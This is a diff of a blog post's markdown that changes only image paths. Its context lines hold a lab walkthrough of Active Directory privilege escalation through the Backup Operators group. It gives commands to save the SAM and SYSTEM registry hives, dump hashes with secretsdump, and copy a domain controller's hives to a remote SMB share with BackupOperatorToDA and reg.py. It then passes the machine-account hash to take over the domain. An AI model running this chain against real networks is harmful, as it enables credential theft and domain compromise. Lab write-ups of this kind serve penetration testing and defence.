@@ -26,25 +26,25 @@ The Backup Operators group is a built-in group in Microsoft Windows operating sy
 #### Setting Up Privilege on Domain Controller
 
 
-[![Image Alt Text](//home/r00tv/Tools/r00tven0m.github.io/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-1.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-1.png)](https://r00tven0m.github.io/)
 
 Let’s configure the lab on the server to apply theory and escalated windows server privileges. Go to server manager dashboard then click on “**Tools**” then select “**Active Directory Users and Computers**
 
 We are going to add a user Serena.Alla to the active directory security group for the demonstration. To do that, go to **“users**” select “**Serena.Alla**” and click on “**properties**”.
 
-[![Image Alt Text](//home/r00tv/Tools/r00tven0m.github.io/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-2.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-2.png)](https://r00tven0m.github.io/)
 
 That will open a new window where we need to click on the “ **member of** “ tab and then click on the “**add**” button to add user to any specific group.
 
-[![Image Alt Text](//home/r00tv/Tools/r00tven0m.github.io/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-3.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-3.png)](https://r00tven0m.github.io/)
 A new window will open where we need to select object types as “**Groups or Built-in security principals**” and select location to domain name which is “**cbank. local**” here. Then, we need to enter object name which is the group to that we wish to add user to. In this case, we are using the **Backup Operators’** group then click ok.
 
-[![Image Alt Text](//home/r00tv/Tools/r00tven0m.github.io/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-4.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-4.png)](https://r00tven0m.github.io/)
 
 
 We can verify whether a user is added to the backups operators’ group by simply clicking on the **members of** tab. We can see that we have successfully added user Serena.Alla to backups operators’ group.
 
-[![Image Alt Text](//home/r00tv/Tools/r00tven0m.github.io/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-5.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-5.png)](https://r00tven0m.github.io/)
 
 
 
@@ -55,7 +55,7 @@ We can verify whether a user is added to the backups operators’ group by simpl
 ```powershell
 Get-DomainUser -Identity Serena.Alla -Domain cbank.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,acco
 ```
-[![Image Alt Text](//home/r00tv/Tools/r00tven0m.github.io/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-6.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-6.png)](https://r00tven0m.github.io/)
 #### Enumerating AD Groups
 
 ```powershell
@@ -65,7 +65,7 @@ Get-DomainGroupMember -Identity 'Backup Operators' | select GroupName,MemberName
 ```
 
 
-[![Image Alt Text](//home/r00tv/Tools/r00tven0m.github.io/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-7.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-7.png)](https://r00tven0m.github.io/)
 #### Backing up SAM and SYSTEM,security Registry Hives
 
 The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`
@@ -75,7 +75,7 @@ reg save hklm\system C:\Users\serena.alla\Documents\system.sav
 reg save hklm\security C:\Users\serena.alla\Documents\security.sav
 ```
 
-[![Image Alt Text](//home/r00tv/Tools/r00tven0m.github.io/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-8.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-8.png)](https://r00tven0m.github.io/)
 
 ### secretsdump.py 
 
@@ -83,7 +83,7 @@ reg save hklm\security C:\Users\serena.alla\Documents\security.sav
 impacket-secretsdump LOCAL -system system.sav -sam sam.sav
 ```
 
-[![Image Alt Text](//home/r00tv/Tools/r00tven0m.github.io/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-9.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-9.png)](https://r00tven0m.github.io/)
 
 but we get hashes local users we need get all hash DC
 
@@ -95,7 +95,7 @@ The [BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA) is a proof 
 net use G: \\192.168.56.1\test /u:test test
 .\BackupOperatorToDA-x64.exe -t \\dc01.cbank.local -o G:\\
 ```
-[![Image Alt Text](//home/r00tv/Tools/r00tven0m.github.io/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-11.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-11.png)](https://r00tven0m.github.io/)
 
 #### Aonther Way Attacking a Domain Controller  with  [reg.py](https://github.com/horizon3ai/backup_dc_registry/blob/main/reg.py "reg.py")
 
@@ -104,13 +104,13 @@ net use G: \\192.168.56.1\test /u:test test
 python3 reg.py Serena.Alla:'Password123'@192.168.56.100 backup -p '\\192.168.56.1\test'
 ```
 
-[![Image Alt Text](//home/r00tv/Tools/r00tven0m.github.io/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-12.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-12.png)](https://r00tven0m.github.io/)
 
 ```bash
 impacket-secretsdump LOCAL -system SYSTEM -sam SAM -security SECURITY
 ```
 
-[![Image Alt Text](//home/r00tv/Tools/r00tven0m.github.io/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-13.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-13.png)](https://r00tven0m.github.io/)
 
 Nice We Can get hash MACHINE ACCOUNT `DC01$` 
 Now the NTLM hash for the Domain Controller has been extracted.
@@ -120,7 +120,7 @@ Now we will provide the NT hash to the secretsdump tool along with the name of t
 impacket-secretsdump cbank.local/'dc01$'@dc01.cbank.local -hashes :c8d2d1f95b533d6326baf3cccdb81d10
 ```
 
-[![Image Alt Text](//home/r00tv/Tools/r00tven0m.github.io/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-14.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Domain Privilege Escalation/Backup Operators/2024-02-13-14.png)](https://r00tven0m.github.io/)
 
 # In Conclusion
 
